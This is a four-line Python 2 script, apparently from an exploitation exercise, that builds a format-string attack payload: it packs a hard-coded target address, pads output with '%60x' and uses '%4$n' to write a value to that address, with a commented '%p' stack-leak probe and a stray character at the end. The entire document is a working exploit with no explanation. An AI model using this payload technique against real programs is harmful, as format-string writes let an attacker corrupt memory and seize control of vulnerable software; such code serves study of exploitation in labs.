import struct
target_address = struct.pack("I", 0x804988c)
print target_address + "%60x" + "%4$n"
# "%p %p %p %p %p %p %p %p"ß